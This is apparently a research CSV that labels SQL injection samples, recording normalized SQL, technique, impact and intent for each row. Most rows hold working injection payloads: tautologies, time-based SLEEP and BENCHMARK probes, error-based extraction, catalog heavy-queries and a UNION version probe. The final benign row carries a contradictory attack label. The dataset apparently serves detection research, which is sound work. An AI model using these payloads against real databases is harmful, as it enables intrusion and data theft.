row_id,source_dataset,source_file,raw_label,raw_sql,sql_normalized,input_type,main_verb,target_tables,target_columns,initial_category,initial_impact,initial_intent,canonical_intent,attack_effect_initial,prompt_style,review_flag_unknown_verb,review_flag_empty_canonical_intent,review_flag_no_target_tables,review_flag_suspect_row,keep,dialect_guess,manual_category,manual_impact,manual_intent,target_table_canonical,prompt_domain_entity,expected_sql_operation,expected_security_violation,requires_sensitive_table,notes,semantic_category,semantic_impact,semantic_intent,semantic_canonical_intent,attack_technique,expected_security_violation.1,uses_union,uses_subquery,uses_stacked_query,uses_comment_termination,uses_time_function,uses_schema_enumeration,problematic_annotation,expected_missing_verb_for_fragment,expected_missing_table_for_fragment,review_flag_problematic_row,target_table_primary,target_num_prompts
14,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1","SELECT * FROM USERS WHERE ID = 1 OR "" ( ]"" OR 1 = 1 -- 1",full_query,SELECT,users,,T1,confidentiality,exfiltrate sensitive data,exfiltrate data from users,T1,,False,False,False,False,,,,,,,,,,,,T1,confidentiality,exfiltrate sensitive data,exfiltrate data from users,comment_terminated,confidentiality,False,False,False,True,False,False,False,False,False,False,users,3
2653,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1   )    )    as nlzg where 1482  =  1482 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --","1 ) ) AS NLZG WHERE 1482 = 1482 PROCEDURE ANALYSE ( EXTRACTVALUE ( 5840,CONCAT ( 0X5C,0X7171706A71, ( SELECT ( CASE WHEN ( 5840 = 5840 ) THEN 1 ELSE 0 END ) ) ,0X717A767A71 ) ) ,1 ) --",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,True,False,False,False,True,True,False,,3
6402,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1'  )   as nftr where 8825  =  8825 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1' ) AS NFTR WHERE 8825 = 8825 OR ( SELECT * FROM ( SELECT ( SLEEP ( 5 ) ) ) SDDO ) #,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,True,False,True,True,False,False,True,True,False,,3
3531,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1 where 6881  =  6881 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --","1 WHERE 6881 = 6881 PROCEDURE ANALYSE ( EXTRACTVALUE ( 5840,CONCAT ( 0X5C,0X7171706A71, ( SELECT ( CASE WHEN ( 5840 = 5840 ) THEN 1 ELSE 0 END ) ) ,0X717A767A71 ) ) ,1 ) --",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,True,False,False,False,True,True,False,,3
5519,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'ozan'  =  'ozan","1' ) ) OR 9643 = ( SELECT COUNT ( * ) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3 ) AND ( ( 'OZAN' = 'OZAN",injection_fragment,UNKNOWN,domains,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,False,False,domains,3
1950,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'rfln'  =  'rfln","1' ) ) ) AND 6510 = ( SELECT COUNT ( * ) FROM SYSUSERS AS SYS1,SYSUSERS AS SYS2,SYSUSERS AS SYS3,SYSUSERS AS SYS4,SYSUSERS AS SYS5,SYSUSERS AS SYS6,SYSUSERS AS SYS7 ) AND ( ( ( 'RFLN' = 'RFLN",injection_fragment,UNKNOWN,sysusers,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,False,False,sysusers,3
7423,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1"" where 3740  =  3740 rlike sleep  (  5  )  #","1"" WHERE 3740 = 3740 RLIKE SLEEP ( 5 ) #",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,False,False,True,True,False,False,True,True,False,,3
10991,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  'nets' like 'nets","1' ) ) ) ( SELECT ( CASE WHEN ( 4587 = 4587 ) THEN REGEXP_SUBSTRING ( REPEAT ( LEFT ( CRYPT_KEY ( CHAR ( 65 ) ||CHAR ( 69 ) ||CHAR ( 83 ) ,NULL ) ,0 ) ,500000000 ) ,NULL ) ELSE CHAR ( 76 ) ||CHAR ( 65 ) ||CHAR ( 102 ) ||CHAR ( 72 ) END ) FROM ( VALUES ( 0 ) ) ) AND ( ( ( 'NETS' LIKE 'NETS",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,True,False,,3
48,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"select * from users where id  =  1 or "".@"" or 1  =  1 -- 1","SELECT * FROM USERS WHERE ID = 1 OR "".@"" OR 1 = 1 -- 1",full_query,SELECT,users,,T1,confidentiality,exfiltrate sensitive data,exfiltrate data from users,T1,,False,False,False,False,,,,,,,,,,,,T1,confidentiality,exfiltrate sensitive data,exfiltrate data from users,comment_terminated,confidentiality,False,False,False,True,False,False,False,False,False,False,users,3
6736,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #","1' ) ) ) OR 8514 = BENCHMARK ( 5000000,MD5 ( 0X544D5A4C ) ) #",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,False,False,True,True,False,False,True,True,False,,3
8215,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   1260  =  1260,1 ) ) AND 4386 = UTL_INADDR.GET_HOST_ADDRESS ( CHR ( 113 ) ||CHR ( 113 ) ||CHR ( 112 ) ||CHR ( 106 ) ||CHR ( 113 ) || ( SELECT ( CASE WHEN ( 4386 = 4386 ) THEN 1 ELSE 0 END ) FROM DUAL ) ||CHR ( 113 ) ||CHR ( 122 ) ||CHR ( 118 ) ||CHR ( 122 ) ||CHR ( 113 ) ) AND ( ( 1260 = 1260,injection_fragment,UNKNOWN,dual,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,fingerprinting_fragment,confidentiality,False,True,False,False,False,False,False,True,False,False,dual,3
1777,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1 OR ( SELECT * FROM ( SELECT ( SLEEP ( 5 ) ) ) SDDO ) #,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,True,False,True,True,False,False,True,True,False,,3
6821,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1""   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  ""hbgr"" like ""hbgr","1"" ) ) ) OR ROW ( 1045,7562 ) > ( SELECT COUNT ( * ) ,CONCAT ( 0X7171706A71, ( SELECT ( ELT ( 1045 = 1045,1 ) ) ) ,0X717A767A71,FLOOR ( RAND ( 0 ) *2 ) ) X FROM ( SELECT 8488 UNION SELECT 5584 UNION SELECT 3051 UNION SELECT 1210 ) A GROUP BY X ) AND ( ( ( ""HBGR"" LIKE ""HBGR",injection_fragment,UNKNOWN,,0x717a767a71,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,union_based_fragment,confidentiality,True,True,False,False,False,False,False,True,True,False,,3
831,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"select * from users where id  =  1 or "",?"" or 1  =  1 -- 1","SELECT * FROM USERS WHERE ID = 1 OR "",?"" OR 1 = 1 -- 1",full_query,SELECT,users,,T1,confidentiality,exfiltrate sensitive data,exfiltrate data from users,T1,,False,False,False,False,,,,,,,,,,,,T1,confidentiality,exfiltrate sensitive data,exfiltrate data from users,comment_terminated,confidentiality,False,False,False,True,False,False,False,False,False,False,users,3
2928,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )","1' OR 7552 = ( SELECT COUNT ( * ) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4 )",injection_fragment,UNKNOWN,rdb,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,False,False,rdb,3
8856,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1' where 2202  =  2202 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","1' WHERE 2202 = 2202 AND 2716 = ( SELECT COUNT ( * ) FROM SYSUSERS AS SYS1,SYSUSERS AS SYS2,SYSUSERS AS SYS3,SYSUSERS AS SYS4,SYSUSERS AS SYS5,SYSUSERS AS SYS6,SYSUSERS AS SYS7 ) --",injection_fragment,UNKNOWN,sysusers,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,True,False,False,False,True,False,False,sysusers,3
6930,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,-6792   )    )    as zlho where 4758  =  4758 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,-6792 ) ) AS ZLHO WHERE 4758 = 4758 OR 2724 IN ( ( CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 112 ) +CHAR ( 106 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 2724 = 2724 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 122 ) +CHAR ( 118 ) +CHAR ( 122 ) +CHAR ( 113 ) ) ) --,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,True,False,False,False,True,True,False,,3
8943,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1'||  (  select 'rdqv' from dual where 1894  =  1894,1'|| ( SELECT 'RDQV' FROM DUAL WHERE 1894 = 1894,injection_fragment,UNKNOWN,dual,'rdqv',T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,False,False,dual,3
5112,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'+  (  select 'mgrj' where 8514  =  8514 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x   )    )   +'","1'+ ( SELECT 'MGRJ' WHERE 8514 = 8514 OR ROW ( 1045,7562 ) > ( SELECT COUNT ( * ) ,CONCAT ( 0X7171706A71, ( SELECT ( ELT ( 1045 = 1045,1 ) ) ) ,0X717A767A71,FLOOR ( RAND ( 0 ) *2 ) ) X FROM ( SELECT 8488 UNION SELECT 5584 UNION SELECT 3051 UNION SELECT 1210 ) A GROUP BY X ) ) +'",injection_fragment,UNKNOWN,,0x717a767a71,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,union_based_fragment,confidentiality,True,True,False,False,False,False,False,True,True,False,,3
5730,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'lmoh' like 'lmoh","1' ) OR 8315 = ( SELECT COUNT ( * ) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 ) AND ( 'LMOH' LIKE 'LMOH",injection_fragment,UNKNOWN,systables,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,False,False,systables,3
7507,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1""  )   as sraw where 1997  =  1997 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --","1"" ) AS SRAW WHERE 1997 = 1997 AND ( SELECT 2* ( IF ( ( SELECT * FROM ( SELECT CONCAT ( 0X7171706A71, ( SELECT ( ELT ( 3484 = 3484,1 ) ) ) ,0X717A767A71,0X78 ) ) S ) , 8446744073709551610, 8446744073709551610 ) ) ) --",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,True,False,False,False,True,True,False,,3
10553,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1' and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and 'ccsb'  =  'ccsb","1' AND 5556 = ( SELECT COUNT ( * ) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5 ) AND 'CCSB' = 'CCSB",injection_fragment,UNKNOWN,all_users,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,False,False,all_users,3
6911,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1%""  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""%""  =  ""","1%"" ) AND 6055 = CTXSYS.DRITHSX.SN ( 6055, ( CHR ( 113 ) ||CHR ( 113 ) ||CHR ( 112 ) ||CHR ( 106 ) ||CHR ( 113 ) || ( SELECT ( CASE WHEN ( 6055 = 6055 ) THEN 1 ELSE 0 END ) FROM DUAL ) ||CHR ( 113 ) ||CHR ( 122 ) ||CHR ( 118 ) ||CHR ( 122 ) ||CHR ( 113 ) ) ) AND ( ""%"" = """,injection_fragment,UNKNOWN,dual,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,False,False,dual,3
523,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"select * from users where id  =  1 or ""@%"" or 1  =  1 -- 1","SELECT * FROM USERS WHERE ID = 1 OR ""@%"" OR 1 = 1 -- 1",full_query,SELECT,users,,T1,confidentiality,exfiltrate sensitive data,exfiltrate data from users,T1,,False,False,False,False,,,,,,,,,,,,T1,confidentiality,exfiltrate sensitive data,exfiltrate data from users,comment_terminated,confidentiality,False,False,False,True,False,False,False,False,False,False,users,3
1237,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1%"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""%""  =  ""","1%"" OR 9643 = ( SELECT COUNT ( * ) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3 ) AND ""%"" = """,injection_fragment,UNKNOWN,domains,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,False,False,domains,3
9609,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )","1 AND 5556 = ( SELECT COUNT ( * ) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5 )",injection_fragment,UNKNOWN,all_users,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,False,False,all_users,3
4556,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  'jvll' like 'jvll","1' ) AND ROW ( 6237,7469 ) > ( SELECT COUNT ( * ) ,CONCAT ( 0X7171706A71, ( SELECT ( ELT ( 6237 = 6237,1 ) ) ) ,0X717A767A71,FLOOR ( RAND ( 0 ) *2 ) ) X FROM ( SELECT 5192 UNION SELECT 3785 UNION SELECT 3931 UNION SELECT 7158 ) A GROUP BY X ) AND ( 'JVLL' LIKE 'JVLL",injection_fragment,UNKNOWN,,0x717a767a71,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,union_based_fragment,confidentiality,True,True,False,False,False,False,False,True,True,False,,3
922,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1%' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and '%'  =  ',1%' AND 4386 = UTL_INADDR.GET_HOST_ADDRESS ( CHR ( 113 ) ||CHR ( 113 ) ||CHR ( 112 ) ||CHR ( 106 ) ||CHR ( 113 ) || ( SELECT ( CASE WHEN ( 4386 = 4386 ) THEN 1 ELSE 0 END ) FROM DUAL ) ||CHR ( 113 ) ||CHR ( 122 ) ||CHR ( 118 ) ||CHR ( 122 ) ||CHR ( 113 ) ) AND '%' = ',injection_fragment,UNKNOWN,dual,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,fingerprinting_fragment,confidentiality,False,True,False,False,False,False,False,True,False,False,dual,3
125,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1","SELECT * FROM USERS WHERE ID = 1 <@$$ UNION SELECT 1,VERSION ( ) -- 1",full_query,SELECT,users,,T1,confidentiality,exfiltrate sensitive data,exfiltrate data from users,T1,,False,False,False,False,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data from users,union_based,confidentiality,True,True,False,True,False,False,False,False,False,False,users,3
662,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"select * from users where id  =  1 or ""@  (  "" or 1  =  1 -- 1","SELECT * FROM USERS WHERE ID = 1 OR ""@ ( "" OR 1 = 1 -- 1",full_query,SELECT,users,,T1,confidentiality,exfiltrate sensitive data,exfiltrate data from users,T1,,False,False,False,False,,,,,,,,,,,,T1,confidentiality,exfiltrate sensitive data,exfiltrate data from users,comment_terminated,confidentiality,False,False,False,True,False,False,False,False,False,False,users,3
3817,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1""  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #","1"" ) OR 8514 = BENCHMARK ( 5000000,MD5 ( 0X544D5A4C ) ) #",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,False,False,True,True,False,False,True,True,False,,3
5175,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1' where 1017  =  1017 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1' WHERE 1017 = 1017 AND 7756 = DBMS_UTILITY.SQLID_TO_SQLHASH ( ( CHR ( 113 ) ||CHR ( 113 ) ||CHR ( 112 ) ||CHR ( 106 ) ||CHR ( 113 ) || ( SELECT ( CASE WHEN ( 7756 = 7756 ) THEN 1 ELSE 0 END ) FROM DUAL ) ||CHR ( 113 ) ||CHR ( 122 ) ||CHR ( 118 ) ||CHR ( 122 ) ||CHR ( 113 ) ) ) --,injection_fragment,UNKNOWN,dual,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,True,False,False,False,True,False,False,dual,3
19338,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,0,"0"" encoding  =  ""utf-8"" ?>   <_filter>  <![CDATA[insert]]>  </_filter>   <_filter>  <![CDATA[signup]]>  </_filter>   <_filter>  <![CDATA[widget_login]]>  </_filter>   <a href  =  ""http://caritaskinshasa","0"" ENCODING = ""UTF-8"" ?> <_FILTER> <![CDATA[INSERT]]> </_FILTER> <_FILTER> <![CDATA[SIGNUP]]> </_FILTER> <_FILTER> <![CDATA[WIDGET_LOGIN]]> </_FILTER> <A HREF = ""HTTP://CARITASKINSHASA",injection_fragment,UNKNOWN,,,B,legitimate,unknown legitimate action,unknown legitimate action,B,,True,False,True,True,,,,,,,,,,,,T2,integrity,modify unauthorized records,modify unauthorized records,write_fragment,integrity,False,False,False,False,False,False,False,True,True,False,,3
